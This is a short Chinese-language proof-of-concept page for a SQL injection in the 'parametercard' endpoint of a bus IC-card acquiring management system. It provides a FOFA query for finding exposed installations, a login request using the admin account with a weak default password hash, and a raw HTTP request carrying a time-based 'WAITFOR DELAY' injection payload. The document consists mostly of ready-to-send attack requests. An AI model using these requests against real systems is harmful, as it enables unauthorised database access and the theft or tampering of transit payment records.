# 公交IC卡收单管理系统parametercard存在SQL注入漏洞

公交IC卡收单管理系统parametercard存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
app="公交IC卡收单管理系统"
```

## poc

获取cookie

```javascript
POST /login HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Priority: u=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest

username=admin&password=e10adc3949ba59abbe56e057f20f883e
```

```javascript
POST /parametercard HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Priority: u=0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: JSESSIONID=BE20D06711487C9D6D5325C1129F244C
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate

method=select&organization=&lineCode=&_search=false&nd=1727249021156&rowCountPerPage=10&pageNo=1&sidx=LINE_CODE&sord=asc&ORGANIZATION_CODE=&LINE_CODE=1');WAITFOR DELAY '0:0:5'--
```

